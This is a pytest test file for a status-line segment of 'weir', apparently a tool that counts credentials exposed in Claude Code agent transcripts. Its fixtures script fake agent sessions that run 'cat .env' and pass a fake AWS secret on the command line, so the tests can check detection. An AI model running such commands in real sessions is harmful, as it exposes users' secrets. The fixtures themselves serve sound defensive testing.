"""Unit tests for `weir statusline` beyond the acceptance tests
(docs/statusline.md). Fake data only, as in statusline_fixtures. What the
segment should count is read from a real `weir audit` run over the same
files."""

from __future__ import annotations

import base64
import gzip
import json
import os
import random
import shlex
import signal
import subprocess
import sys
import time
import zlib
from pathlib import Path

import audit_fixtures as fx
import canary_fixtures as cfx
import pytest
import statusline_fixtures as sx
from click.testing import CliRunner

from weir.audit import load_inputs
from weir.audit.matching import Matcher
from weir.cli.main import main
from weir.statusline import compose, segment
from weir.statusline import setup as statusline_setup


def _session(claude: sx.Claude) -> fx.Session:
    v = claude.setup.values
    session = fx.Session()
    session.prompt("look around")
    session.tool_use("Bash", {"command": "cat .env"}, "toolu_1")
    session.tool_result("toolu_1", f"{fx.ACME}={v[fx.ACME]}\n")
    session.tool_use("Bash", {"command": f"aws --secret {v[fx.AWS_SECRET]} s3 ls"}, "toolu_2")
    return session


def _expected(claude: sx.Claude) -> str:
    return sx.segment_for(sx.expected_counts(claude.setup, claude.audit())) + "\n"


# --- what is read, and what is unknown ----------------------------------------------


def test_a_line_still_being_written_counts_as_unread_until_it_stops_changing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A last line without its line end, in a file changed in the last
    seconds, is a record Claude Code is still writing: unread, so the
    segment says scanning, never a count that may be a false zero."""
    claude = sx.build(tmp_path)
    path = _session(claude).write(claude.transcript())
    whole = path.read_bytes()
    path.write_bytes(whole[: len(whole) - 40])

    fresh = claude.statusline()
    monkeypatch.setattr(segment, "FRESH_TAIL_S", 0.0)  # the line stopped changing
    stopped = claude.statusline()
    stopped_audit = claude.audit()
    monkeypatch.undo()
    path.write_bytes(whole)
    complete = claude.statusline()

    assert fresh.stdout.startswith("weir: ") and "scanning…" in fresh.stdout
    assert stopped.stdout == sx.segment_for(sx.expected_counts(claude.setup, stopped_audit)) + "\n"
    assert "unknown" in stopped.stdout
    assert complete.stdout == _expected(claude)
    assert complete.stdout == "weir: 2 in context, 1 sent\n"


@pytest.mark.parametrize("how", ["shrunk", "start changed", "replaced"])
def test_a_file_rewritten_under_the_reader_is_read_again_from_the_start(
    tmp_path: Path, how: str
) -> None:
    claude = sx.build(tmp_path)
    path = _session(claude).write(claude.transcript())
    assert claude.statusline().stdout == "weir: 2 in context, 1 sent\n"
    other = fx.Session()
    other.prompt("a new start" if how != "shrunk" else "short")
    other.tool_use("Bash", {"command": "ls"}, "toolu_9")
    data = "".join(line + "\n" for line in other.lines).encode()
    if how == "start changed":
        data += path.read_bytes()[len(data) :]
    if how == "replaced":
        path.unlink()
    path.write_bytes(data)

    assert claude.statusline().stdout == _expected(claude)


@pytest.mark.parametrize(
    "what", ["empty transcript", "compressed transcript", "compressed saved output",
             "compressed subagent", "symbolic link", "unknown file"],
)
def test_what_the_audit_cannot_read_is_unknown_never_zero(tmp_path: Path, what: str) -> None:
    claude = sx.build(tmp_path)
    plain = fx.Session()
    plain.prompt("list the files")
    plain.write(claude.transcript())
    packed = gzip.compress(b"nothing secret in here\n")
    place = {"compressed saved output": "tool-results/t1.txt.gz",
             "compressed subagent": "subagents/agent-a1.jsonl", "unknown file": "notes.dat"}
    if what == "empty transcript":
        claude.transcript().write_bytes(b"")
    elif what == "compressed transcript":
        claude.transcript().write_bytes(packed)
    elif what == "symbolic link":
        claude.session_dir().mkdir()
        (claude.session_dir() / "link.jsonl").symlink_to(claude.transcript())
    else:
        target = claude.session_dir() / place[what]
        target.parent.mkdir(parents=True)
        target.write_bytes(packed if what != "unknown file" else b"opaque\n")

    assert claude.statusline().stdout == "weir: unknown\n"


@pytest.mark.parametrize(
    "record",
    [{"type": "system", "subtype": "turn_duration", "durationMs": 1200},
     {"type": "progress", "data": {"type": "hook_progress", "hookEvent": "PostToolUse"}},
     {"type": "attachment", "attachment": {"type": "todo_reminder", "content": []}}],
)
def test_a_refresh_that_reads_only_a_record_the_format_does_not_name_stays_known(
    tmp_path: Path, record: dict[str, object]
) -> None:
    """The file's format is decided once, from its start: a step that reads
    only a `system`, `progress` or `attachment` record is audited in it."""
    claude = sx.build(tmp_path)
    session = _session(claude)
    session.write(claude.transcript())
    assert claude.statusline().stdout == _expected(claude)
    fields = dict(record)
    session.record(session._envelope(str(fields.pop("type")), **fields))
    session.write(claude.transcript())

    run = claude.statusline()

    assert not claude.audit()["unknown"]
    assert run.stdout == _expected(claude)


@pytest.mark.parametrize(
    "first",
    [{"type": "attachment", "attachment": {"type": "hook_success", "content": "ok"}},
     {"type": "system", "subtype": "informational", "content": "a hook ran"},
     {"type": "attachment", "attachment": {"type": "hook_success", "content": "x" * 70_000}}],
    ids=["hook attachment", "system record", "70 KiB attachment"],
)
@pytest.mark.parametrize("cache", ["kept", "empty"])
def test_records_before_the_first_prompt_leave_the_format_open(
    tmp_path: Path, first: dict[str, object], cache: str
) -> None:
    """A step recognised as no format on its own (what Claude Code writes
    before the first prompt) does not decide the file's format: once a step
    is recognised, the file is read again from its start in that format,
    as `weir audit` reads the whole file."""
    claude = sx.build(tmp_path)
    session = fx.Session()
    fields = dict(first)
    session.record(session._envelope(str(fields.pop("type")), **fields))
    session.write(claude.transcript())
    before = claude.statusline()
    before_audit = claude.audit()
    session.lines.extend(_session(claude).lines)
    session.write(claude.transcript())
    if cache == "empty":
        for path in claude.state.glob("*.json"):
            path.unlink()

    run = claude.statusline()

    assert before.stdout == sx.segment_for(sx.expected_counts(claude.setup, before_audit)) + "\n"
    assert run.stdout == _expected(claude)
    assert run.stdout == "weir: 2 in context, 1 sent\n"


def test_a_last_line_that_stopped_mid_line_can_decide_the_format(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    claude = sx.build(tmp_path)
    session = fx.Session()
    session.record(session._envelope("attachment", attachment={"type": "hook_success"}))
    session.write(claude.transcript())
    claude.statusline()
    session.tool_result("toolu_1", f"{fx.ACME}={claude.setup.values[fx.ACME]}\n")
    path = session.write(claude.transcript())
    path.write_bytes(path.read_bytes().rstrip(b"\n"))
    monkeypatch.setattr(segment, "FRESH_TAIL_S", 0.0)  # the line stopped changing

    run = claude.statusline()

    assert run.stdout == _expected(claude)
    assert run.stdout == "weir: 1 in context, 0 sent\n"


@pytest.mark.parametrize("how", ["removed", "unreadable", "unreadable subagents directory"])
def test_a_session_file_gone_or_unreadable_while_listed_is_unknown_not_an_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, how: str
) -> None:
    claude = sx.build(tmp_path)
    plain = fx.Session()
    plain.prompt("list the files")
    plain.write(claude.transcript())
    saved = claude.session_dir() / "tool-results" / "toolu_01.txt"
    saved.parent.mkdir(parents=True)
    saved.write_text("plain output\n")
    subagents = claude.session_dir() / "subagents"
    agent = fx.Session(session_id="agent-a1")
    agent.tool_use("Bash", {"command": f"aws --secret {claude.setup.values[fx.AWS_SECRET]}"}, "t1")
    agent.write(subagents / "agent-a1.jsonl")
    if how != "removed":
        if os.name != "posix" or os.geteuid() == 0:
            pytest.skip("permission bits do not stop this user reading the file")
        (saved if how == "unreadable" else subagents).chmod(0)
    else:
        real = os.lstat

        def lstat(path: str, *args: object, **kwargs: object) -> os.stat_result:
            if path == str(saved):  # removed between the walk and the stat
                raise FileNotFoundError(2, "No such file or directory", path)
            return real(path, *args, **kwargs)  # type: ignore[arg-type]

        monkeypatch.setattr(os, "lstat", lstat)

    run = claude.statusline()
    monkeypatch.undo()
    saved.chmod(0o600)
    subagents.chmod(0o700)

    if how == "unreadable subagents directory":
        assert run.stdout == "weir: unknown\n"
    else:
        context, sent, _ = sx.expected_counts(claude.setup, claude.audit())
        assert run.stdout == sx.segment_for((context, sent, True)) + "\n"


def test_a_saved_output_that_holds_an_old_session_is_stored_not_sent(tmp_path: Path) -> None:
    """The agent printed an old session file: its records sit in a saved
    tool output, which `weir audit` reads as stored text and the segment
    does not count."""
    claude = sx.build(tmp_path)
    v = claude.setup.values
    session = fx.Session()
    session.prompt("show me the old session")
    session.write(claude.transcript())
    old = fx.Session(session_id="00000000-0000-4000-8000-000000000001")
    old.tool_use("Bash", {"command": f"aws --secret {v[fx.AWS_SECRET]} s3 ls"}, "toolu_old")
    old.write(claude.session_dir() / "tool-results" / "toolu_01.txt")

    run = claude.statusline()

    audit = claude.audit()
    formats = {f["format"] for f in audit["files"]}  # type: ignore[union-attr]
    assert "claude-code-tool-results" in formats
    assert sx.expected_counts(claude.setup, audit) == (0, 0, False)
    assert run.stdout == "weir: 0 in context, 0 sent\n"


@pytest.mark.parametrize("stdin", ["not json", "[]", '{"session_id": "x"}'])
def test_input_that_is_not_the_status_line_json_says_so(tmp_path: Path, stdin: str) -> None:
    claude = sx.build(tmp_path)
    args = ["statusline", *claude.inputs(), "--cache", str(claude.state)]

    run = claude.invoke(args, stdin=stdin)

    assert (run.exit_code, run.stdout) == (0, "weir: no session\n")


def test_a_wrong_key_is_an_error_word_on_the_line(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    _session(claude).write(claude.transcript())
    cfx.write(claude.setup.key, "cd" * 32 + "\n")

    assert claude.statusline().stdout == "weir: error, run /weir\n"


def test_a_checkpoint_from_another_inventory_is_not_used(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    _session(claude).write(claude.transcript())
    first = claude.statusline()
    report = json.loads(claude.setup.report.read_text())
    report["credentials"] = [c for c in report["credentials"] if c["value_state"] != "literal"]
    store = json.loads(claude.setup.store.read_text())
    store["records"] = []
    cfx.write(claude.setup.report, json.dumps(report))
    cfx.write(claude.setup.store, json.dumps(store))

    second = claude.statusline()

    assert first.stdout != second.stdout
    assert second.stdout == _expected(claude)


def test_the_checkpoint_holds_no_value_or_file_name_in_any_encoding(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    v = claude.setup.values
    _session(claude).write(claude.transcript())
    sub = fx.Session()
    sub.prompt(f"use {v[fx.GH]}")
    sub.write(claude.session_dir() / "subagents" / f"{v[fx.ACME]}.jsonl")
    claude.statusline()
    claude.statusline(extra=["--budget-ms", "0"])

    s = claude.setup
    inputs = load_inputs(s.report, s.store, s.key)
    matcher = Matcher(inputs.key, set(inputs.by_fingerprint))
    names = [p.name.encode() for p in claude.session_dir().rglob("*") if p.is_file()]
    names.append(claude.transcript().name.encode())
    cached = [p for p in claude.state.rglob("*") if p.is_file()]
    assert cached
    for path in cached:
        data = path.read_bytes()
        assert not matcher.find(data.decode()), path
        cfx.assert_value_free(path.name + "\n" + data.decode(), v.values())
        for name in names:
            assert name not in data and name.hex().encode() not in data, (path, name)


# --- a long record ------------------------------------------------------------------


def _until_read(claude: sx.Claude, budget_ms: str | None = "0") -> list[str]:
    """The segment run after run until it has read everything: each run
    taking one step, or with `budget_ms` None, as many as the default time
    bound allows."""
    extra = [] if budget_ms is None else ["--budget-ms", budget_ms]
    shown: list[str] = []
    while not shown or "scanning" in shown[-1]:
        assert len(shown) < 200, shown
        shown.append(claude.statusline(extra=extra).stdout)
    return shown


def _offsets(claude: sx.Claude) -> list[int]:
    """The byte offsets read to, in the checkpoint docs/statusline.md
    describes."""
    (checkpoint,) = claude.state.glob("*.json")
    return [entry["offset"] for entry in json.loads(checkpoint.read_bytes())["files"].values()]


def _long_record(session: fx.Session, record: str, value: str) -> None:
    """A record of about 300 KiB or more, `value` in it once (but in `not a
    record`)."""
    log = "".join(f"{n} a line of a long fake log, nothing secret here\n" for n in range(6_200))
    if record == "a long text record":
        session.tool_use("Read", {"file_path": "/fake/huge.log"}, "toolu_log")
        session.tool_result("toolu_log", log + f"{fx.ACME}={value}\n")
    elif record == "a tool result and its copy":
        session.tool_use("Bash", {"command": "cat huge.log"}, "toolu_cat")
        sx.tool_result_and_copy(session, "toolu_cat", log + f"{fx.ACME}={value}\n")
    elif record == "a dense lockfile and its copy":
        lock = sx.dense_lockfile(200_000)
        half = len(lock) // 2
        session.tool_use("Read", {"file_path": "/fake/package-lock.json"}, "toolu_lock")
        text = lock[:half] + f"{fx.ACME}={value}\n" + lock[half:]
        sx.tool_result_and_copy(session, "toolu_lock", text)
    elif record == "a compressed PDF":
        pdf = _pdf(f"{fx.ACME}={value}", filter_name=None, filler=0, compressed=300_000)
        data = base64.b64encode(pdf).decode()
        source = {"type": "base64", "media_type": "application/pdf", "data": data}
        session.tool_use("Read", {"file_path": "/fake/report.pdf"}, "toolu_pdf")
        session.tool_result("toolu_pdf", [{"type": "document", "source": source}])
    elif record == "many short blocks":
        blocks: list[object] = [{"type": "text", "text": line} for line in log.splitlines()]
        blocks[3_000] = {"type": "text", "text": f"{fx.ACME}={value}"}
        session.tool_use("mcp__db__query", {"sql": "select *"}, "toolu_q")
        session.tool_result("toolu_q", blocks)
    elif record == "a pasted image":
        data = base64.b64encode(random.Random(3).randbytes(225_000)).decode()
        source = {"type": "base64", "media_type": "image/png", "data": data}
        content = [{"type": "image", "source": source}, {"type": "text", "text": "what is it?"}]
        session.record(session._envelope("user", message={"role": "user", "content": content}))  # pyright: ignore[reportPrivateUsage]
        session.tool_use("Bash", {"command": "cat .env"}, "toolu_env")
        session.tool_result("toolu_env", f"{fx.ACME}={value}\n")
    else:
        session.raw_line("not a record " * 24_000)


@pytest.mark.parametrize("budget_ms", [None, "0"], ids=["default budget", "no budget"])
@pytest.mark.parametrize(
    "record",
    ["a tool result and its copy", "a dense lockfile and its copy", "a compressed PDF",
     "a pasted image"],
)
def test_a_long_record_searched_within_its_time_bound_is_counted_exactly(
    tmp_path: Path, record: str, budget_ms: str | None
) -> None:
    """A long record has a time bound of its own, whatever `--budget-ms`
    says: an ordinary large tool result with its copy, a dense lockfile
    with its copy (about 400 KB), a compressed PDF of 300 KB (whose
    compressed bytes are not searched, so the session is part unknown) and
    a pasted image (whose data is never searched) each give what `weir
    audit` gives within a few refreshes."""
    claude = sx.build(tmp_path)
    session = fx.Session()
    session.prompt("look at the fake data")
    _long_record(session, record, claude.setup.values[fx.ACME])
    path = session.write(claude.transcript())

    shown = _until_read(claude, budget_ms)

    assert path.stat().st_size > 2 * segment.LONG_RECORD_BYTES
    assert len(shown) <= 4, shown
    assert shown[-1] == _expected(claude)
    assert "1 in context" in shown[-1]


@pytest.mark.parametrize(
    ("record", "line_end"),
    [("a long text record", True), ("a long text record", False), ("many short blocks", True),
     ("not a record", True)],
    ids=["long text", "long text stopped mid-line", "many short blocks", "not a record"],
)
def test_a_long_record_not_searched_within_the_time_bound_leaves_the_session_partly_checked(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, record: str, line_end: bool
) -> None:
    """With no time for it (a time bound of 0 for a long record), a long
    record is tried in three runs and then skipped: the segment shows the
    session partly checked, never a count, reads on past it to the end,
    and the /weir report gives the counts `weir audit` gives."""
    monkeypatch.setattr(segment, "LONG_RECORD_S", 0.0)
    claude = sx.build(tmp_path)
    v = claude.setup.values
    session = fx.Session()
    session.prompt("look at the fake data")
    if line_end:
        _long_record(session, record, v[fx.ACME])
        session.tool_use("Bash", {"command": f"aws --secret {v[fx.AWS_SECRET]} s3 ls"}, "toolu_2")
    else:
        session.tool_use("Bash", {"command": f"aws --secret {v[fx.AWS_SECRET]} s3 ls"}, "toolu_2")
        _long_record(session, record, v[fx.ACME])
    path = session.write(claude.transcript())
    if not line_end:
        path.write_bytes(path.read_bytes().removesuffix(b"\n"))
        monkeypatch.setattr(segment, "FRESH_TAIL_S", 0.0)  # the line stopped changing

    end = path.stat().st_size if line_end else path.read_bytes().rfind(b"\n") + 1
    shown = _until_read(claude)
    while _offsets(claude) != [end]:  # read on past it
        assert len(shown) < 20, shown
        shown.append(claude.statusline(extra=["--budget-ms", "0"]).stdout)
    report = claude.invoke(["statusline", "report", *claude.inputs(), "--session", fx.SESSION_ID])

    assert path.stat().st_size > 2 * segment.LONG_RECORD_BYTES
    assert report.lines[0] + "\n" == _expected(claude)
    assert "1 sent" in report.lines[0]
    first = next(n for n, line in enumerate(shown) if "partly" in line)
    assert shown[first:] == [sx.PARTLY_CHECKED + "\n"] * (len(shown) - first)


def test_a_long_record_reached_late_in_a_run_waits_for_a_whole_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Earlier steps can use up most of a run's time bound: a long record
    reached then waits for the next run, which starts with it, and the
    counts are what `weir audit` gives."""
    claude = sx.build(tmp_path)
    session = fx.Session()
    session.prompt("read the fake logs")
    filler = "".join(f"{n} a line of a fake log, nothing secret here\n" for n in range(1_600))
    for n in range(2):
        session.tool_use("Read", {"file_path": f"/fake/part{n}.log"}, f"toolu_{n}")
        session.tool_result(f"toolu_{n}", filler)
    _long_record(session, "a tool result and its copy", claude.setup.values[fx.ACME])
    session.write(claude.transcript())
    audit = segment.audit_chunks

    def slow(inputs: object, chunks: list[tuple[str, bytes]], *rest: object) -> object:
        if all(len(data) <= segment.LONG_RECORD_BYTES for _, data in chunks):
            time.sleep(0.2)  # a step of short records, slow: three use most of the run
        else:
            time.sleep(0.5)  # the long record: more than what is left of such a run
        return audit(inputs, chunks, *rest)  # type: ignore[arg-type]

    monkeypatch.setattr(segment, "audit_chunks", slow)
    shown = _until_read(claude, "1000")

    assert len(shown) <= 3
    assert shown[-1] == _expected(claude)
    assert "1 in context" in shown[-1]


@pytest.mark.parametrize("record", ["a tool result and its copy", "a line of exactly 128 KiB"])
def test_a_subagents_long_record_is_counted_while_the_transcript_grows(
    tmp_path: Path, record: str
) -> None:
    """Claude Code refreshes the status line as the transcript grows: a long
    record in a subagent's transcript, as short as a long record can be
    too, is still searched within a few refreshes, and the counts are what
    `weir audit` gives."""
    claude = sx.build(tmp_path)
    session = fx.Session()
    session.prompt("ask a subagent to read the fake log")
    session.tool_use("Task", {"prompt": "read the fake log"}, "toolu_task")
    transcript = session.write(claude.transcript())
    sub = fx.Session()
    sub.prompt("read the fake log")
    value = claude.setup.values[fx.ACME]
    if record == "a line of exactly 128 KiB":
        _record_of(sub, segment.LONG_RECORD_BYTES, f"{fx.ACME}={value}\n")
    else:
        _long_record(sub, record, value)
    agent = sub.write(claude.session_dir() / "subagents" / "agent-1.jsonl")

    shown: list[str] = []
    for n in range(4):
        session.assistant_text(f"still working, step {n}")
        with transcript.open("a") as handle:
            handle.write(session.lines[-1] + "\n")
        shown.append(claude.statusline().stdout)

    assert agent.stat().st_size > segment.LONG_RECORD_BYTES
    assert shown[-1] == _expected(claude)
    assert "1 in context" in shown[-1]


def _record_of(session: fx.Session, size: int, text: str) -> None:
    """A tool result holding `text`, its line `size` bytes long without its
    line end."""
    session.tool_use("Read", {"file_path": "/fake/exact.log"}, "toolu_exact")
    session.tool_result("toolu_exact", text)
    short = size - len(session.lines.pop().encode())
    session.tool_result("toolu_exact", text + "." * short)
    assert len(session.lines[-1].encode()) == size


def _pdf(
    text: str, *, filter_name: bytes | None, filler: int, compressed: int = 0
) -> bytes:
    """A one-page PDF whose page shows `text`, its content stream
    compressed under a filter written as `filter_name` or not compressed,
    after `filler` characters of an uncompressed stream of other text and
    `compressed` bytes of a compressed stream (a font, say)."""
    page = f"BT /F1 12 Tf 72 712 Td ({text}) Tj ET".encode()
    stream = page if filter_name is None else zlib.compress(page)
    pad = b"".join(b"(%d a line of a fake report) Tj\n" % n for n in range(filler // 30))
    flate = b"" if filter_name is None else b" " + filter_name + b" /FlateDecode"
    font = random.Random(compressed).randbytes(compressed)
    return (
        b"%%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
        b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
        b"3 0 obj << /Type /Page /Parent 2 0 R /Contents [4 0 R 5 0 R] >> endobj\n"
        b"4 0 obj << /Length %d >> stream\n%s\nendstream endobj\n"
        b"5 0 obj << /Length %d%s >> stream\n%s\nendstream endobj\n"
        % (len(pad), pad, len(stream), flate, stream)
    ) + (
        b"6 0 obj << /Length %d /Filter /FlateDecode >> stream\n%s\nendstream endobj\n"
        % (len(font), font) if compressed else b""
    ) + b"%%EOF\n"


@pytest.mark.parametrize("filler", [0, 150_000], ids=["short", "200 KiB"])
@pytest.mark.parametrize(
    "filter_name", [None, b"/Filter", b"/Fil#74er"],
    ids=["plain", "compressed", "compressed, its filter's name escaped"],
)
def test_a_pdf_the_agent_read_is_searched_or_unknown(
    tmp_path: Path, filter_name: bytes | None, filler: int
) -> None:
    """A PDF's text in a plain content stream is searched; text in a
    compressed stream cannot be matched exactly, however the filter's name
    is written, so the session is unknown there, never clean. A PDF of
    200 KiB, nearly all of it a plain stream, is searched within its time
    bound."""
    claude = sx.build(tmp_path)
    s = claude.setup
    data = base64.b64encode(_pdf(f"{fx.ACME}={s.values[fx.ACME]}", filter_name=filter_name,
                                 filler=filler)).decode()
    source = {"type": "base64", "media_type": "application/pdf", "data": data}
    session = fx.Session()
    session.prompt("read the fake report")
    session.tool_use("Read", {"file_path": "/fake/report.pdf"}, "toolu_pdf")
    line, _ = session.tool_result("toolu_pdf", [{"type": "document", "source": source}])
    session.write(claude.transcript())

    report = claude.audit()
    shown = _until_read(claude, None)

    state = fx.credential(report, s.ids[fx.ACME])["state"]
    reasons = [(u["reason"], u["subject"]) for u in report["unknown"]]  # type: ignore[union-attr,index]
    if filter_name is not None:
        assert state == "not_found"
        assert ("not_scanned", f"{claude.transcript()}:{line}") in reasons
    else:
        assert state == "in_context"
        assert reasons == []
    assert shown[-1] == _expected(claude)
    assert filter_name is None or "unknown" in shown[-1]


# --- the existing status line ------------------------------------------------------


@pytest.mark.parametrize(
    ("inner", "shown"),
    [
        (sx.python_command("import sys; sys.exit(3)"), "weir: x"),
        (sx.python_command("print()"), "weir: x"),
        (sx.python_command("import sys; print(sys.stdin.read())"), "{} | weir: x"),
        (sx.python_command("print('a'); print('b')"), "a\nb | weir: x"),
        (sx.python_command("import sys; sys.stdout.buffer.write(b'x\\r\\n')"), "x | weir: x"),
        (sx.python_command("import time; time.sleep(5)"), "weir: x"),
    ],
)
def test_the_existing_command_is_shown_beside_the_segment(
    monkeypatch: pytest.MonkeyPatch, inner: str, shown: str
) -> None:
    monkeypatch.setattr(compose, "INNER_TIMEOUT_S", 1.0)

    line = compose.run_beside(inner, b"{}", lambda: "weir: x")

    assert line.replace("\r\n", "\n") == shown


def _spawns_a_child(pid_file: Path) -> str:
    """An existing command that leaves a child behind it and runs on."""
    return f"sleep 30 & echo $! > {shlex.quote(str(pid_file))}; sleep 30"


def _child_left(pid_file: Path) -> bool:
    """Whether the child is still running a moment after the run ended; a
    child left is killed, so the test leaves nothing behind."""
    deadline = time.monotonic() + 5
    while not pid_file.exists() or not pid_file.read_text().strip():
        assert time.monotonic() < deadline, "the existing command did not start"
        time.sleep(0.02)
    pid = int(pid_file.read_text())

    def alive() -> bool:
        try:
            os.kill(pid, 0)
            state = Path(f"/proc/{pid}/stat").read_text().rsplit(")", 1)[1].split()[0]
        except (ProcessLookupError, FileNotFoundError):
            return False
        return state != "Z"  # a zombie has ended, its parent has yet to reap it

    deadline = time.monotonic() + 3
    while alive() and time.monotonic() < deadline:
        time.sleep(0.05)
    left = alive()
    if left:
        os.kill(pid, signal.SIGKILL)
    return left


@pytest.mark.skipif(not Path("/proc/self/stat").exists(), reason="reads process state in /proc")
def test_the_existing_commands_children_are_stopped_at_the_time_bound(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(compose, "INNER_TIMEOUT_S", 1.0)
    pid_file = tmp_path / "child.pid"

    line = compose.run_beside(_spawns_a_child(pid_file), b"{}", lambda: "weir: x")

    assert line == "weir: x"
    assert not _child_left(pid_file)


@pytest.mark.skipif(not Path("/proc/self/stat").exists(), reason="reads process state in /proc")
@pytest.mark.parametrize("cancel", ["SIGTERM", "SIGINT", "SIGHUP"])
def test_the_existing_commands_children_are_stopped_when_the_run_is_cancelled(
    tmp_path: Path, cancel: str
) -> None:
    """A run still going is cancelled with SIGTERM; SIGINT and SIGHUP (a
    closed terminal) stop it the same way."""
    claude = sx.build(tmp_path)
    _session(claude).write(claude.transcript())
    pid_file = tmp_path / "child.pid"
    command = [sys.executable, "-m", "weir", "statusline", *claude.inputs(),
               "--cache", str(claude.state), "--inner", _spawns_a_child(pid_file)]
    run = subprocess.Popen(
        command, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        env={**claude.env(), "PATH": os.environ.get("PATH", "")},
    )
    assert run.stdin is not None
    run.stdin.write(sx.status_json(claude.transcript(), fx.SESSION_ID).encode())
    run.stdin.close()
    deadline = time.monotonic() + 10
    while not pid_file.exists():
        assert time.monotonic() < deadline, "the existing command did not start"
        time.sleep(0.02)

    run.send_signal(getattr(signal, cancel))
    run.wait(timeout=10)

    assert not _child_left(pid_file)


# --- setup and undo -----------------------------------------------------------------


@pytest.mark.parametrize(
    ("answer", "yes"),
    [("yes\n", True), ("yes", True), ("yes\r\n", True), ("y\n", False), ("YES\n", False),
     ("Yes\n", False), ("yes please\n", False), (" yes\n", False), ("\tyes\n", False),
     ("yes \n", False), ("", False)],
)
def test_only_the_exact_line_yes_confirms(answer: str, yes: bool) -> None:
    assert statusline_setup.confirmed(answer) is yes


def _setup(claude: sx.Claude, *flags: str, answer: str | None = "yes\n") -> sx.Run:
    args = ["statusline", "setup", *claude.inputs(), "--cache", str(claude.state),
            "--claude-dir", str(claude.config), *flags]
    return claude.invoke(args, stdin=answer)


def _undo(claude: sx.Claude, answer: str = "yes\n") -> sx.Run:
    args = ["statusline", "undo", "--claude-dir", str(claude.config)]
    return claude.invoke(args, stdin=answer)


def _files(root: Path) -> dict[str, bytes]:
    return {str(p): p.read_bytes() for p in root.rglob("*") if p.is_file()}


def _settled(claude: sx.Claude) -> dict[str, object]:
    """The config directory's files, settings.json as the JSON it holds."""
    files: dict[str, object] = dict(_files(claude.config))
    files[str(claude.settings)] = json.loads(claude.settings.read_bytes())
    return files


@sx.posix_shell
@pytest.mark.parametrize("stop_after", ["setup's backup", "undo's settings"])
def test_an_interrupted_setup_or_undo_leaves_both_usable(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, stop_after: str
) -> None:
    claude = sx.build(tmp_path)
    claude.settings.write_bytes(b'{"theme": "dark"}\n')
    before = _settled(claude)
    real = statusline_setup.write_atomic

    class Stopped(BaseException):
        """The process stops here, between two of its writes."""

    def crash_after(path: Path, data: bytes, mode: int) -> None:
        real(path, data, mode)
        if path.name.endswith(".weir-backup") or stop_after == "undo's settings":
            raise Stopped

    if stop_after == "undo's settings":
        assert _setup(claude).exit_code == 0
    monkeypatch.setattr(statusline_setup, "write_atomic", crash_after)
    with pytest.raises(Stopped):
        _setup(claude) if stop_after == "setup's backup" else _undo(claude)
    monkeypatch.undo()

    assert _undo(claude).exit_code == 0
    assert _settled(claude) == before
    assert _setup(claude).exit_code == 0
    assert _undo(claude).exit_code == 0
    assert _settled(claude) == before


@sx.posix_shell
def test_undo_after_setup_stopped_creates_no_settings_file(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    claude = sx.build(tmp_path)
    real = statusline_setup.write_atomic

    class Stopped(BaseException):
        """The process stops after setup's first write, the backup."""

    def crash_after(path: Path, data: bytes, mode: int) -> None:
        real(path, data, mode)
        raise Stopped

    monkeypatch.setattr(statusline_setup, "write_atomic", crash_after)
    with pytest.raises(Stopped):
        _setup(claude)
    monkeypatch.undo()

    assert _undo(claude).exit_code == 0
    assert not claude.settings.exists()
    assert not Path(str(claude.settings) + ".weir-backup").exists()


@sx.posix_shell
@pytest.mark.parametrize(
    "original",
    [None, b"", b'{"theme":"dark"}', b'{\n    "theme": "dark"\n}\n',
     '{"name": "café", "n": 1E20}\n'.encode(),
     b'{"statusLine": {"type": "command", "command": "echo hi"}}'],
    ids=["no file", "empty file", "compact", "indent 4", "non-ASCII and exponent",
         "a status line"],
)
def test_undo_gives_back_the_settings_bytes_when_nothing_else_changed(
    tmp_path: Path, original: bytes | None
) -> None:
    claude = sx.build(tmp_path)
    if original is not None:
        claude.settings.write_bytes(original)
    assert _setup(claude).exit_code == 0

    assert _undo(claude).exit_code == 0

    assert (claude.settings.read_bytes() if claude.settings.exists() else None) == original


@sx.posix_shell
def test_undo_knows_the_status_line_setup_wrote_whatever_its_cache(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    claude.settings.write_bytes(b'{"theme": "dark"}\n')
    assert _setup(claude, "--cache", str(tmp_path / "elsewhere")).exit_code == 0

    run = _undo(claude)  # with no --cache

    assert run.exit_code == 0, run.stderr
    assert claude.settings.read_bytes() == b'{"theme": "dark"}\n'
    assert not claude.command_file.exists()


@sx.posix_shell
@pytest.mark.parametrize(
    "settings",
    [b"{not json", b"[1, 2]", b'{"statusLine": "echo hi"}',
     b'{"statusLine": {"type": "command", "command": 3}}'],
)
def test_setup_refuses_settings_it_cannot_change_safely(tmp_path: Path, settings: bytes) -> None:
    claude = sx.build(tmp_path)
    claude.settings.write_bytes(settings)
    before = _files(claude.setup.home)

    assert _setup(claude).exit_code == 2
    assert _files(claude.setup.home) == before


@sx.posix_shell
def test_setup_refuses_twice_and_a_different_weir_command(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    assert _setup(claude).exit_code == 0
    after = _files(claude.setup.home)
    assert _setup(claude).exit_code == 1
    assert _files(claude.setup.home) == after
    assert _undo(claude).exit_code == 0

    claude.command_file.parent.mkdir(parents=True)
    claude.command_file.write_text("my own /weir\n")
    run = _setup(claude)

    assert run.exit_code == 1
    assert str(claude.command_file) in run.stderr
    assert claude.command_file.read_text() == "my own /weir\n"


@sx.posix_shell
def test_setup_reads_no_key_and_never_shows_the_existing_command(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    command = "~/.claude/my-status-line.sh --colour"
    claude.settings.write_text(json.dumps({"statusLine": {"type": "command", "command": command}}))
    claude.setup.key.unlink()

